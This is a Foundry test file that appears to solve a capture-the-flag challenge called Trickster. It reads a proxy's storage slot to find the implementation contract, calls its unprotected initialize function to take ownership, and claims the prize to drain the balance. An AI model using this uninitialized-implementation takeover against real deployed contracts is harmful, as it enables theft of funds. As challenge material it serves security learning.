// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Trickster.sol";

contract TricksterTest is Test {
    JackpotProxy public target;
    address public player;

    function setUp() public {
        target = new JackpotProxy{value: 0.0001 ether}();
        player = vm.addr(1);

        vm.label(address(target), "Challenge");
        vm.label(player, "Player");
    }

    function testTrickster() public {
        vm.startPrank(player);

        address jackpotAddress = address(
            uint160(uint256(vm.load(address(target), bytes32(uint256(1)))))
        );

        Jackpot(payable(jackpotAddress)).initialize(player);
        Jackpot(payable(jackpotAddress)).claimPrize(jackpotAddress.balance / 2);

        assertTrue(target.balance() == 0);

        vm.stopPrank();
    }
}
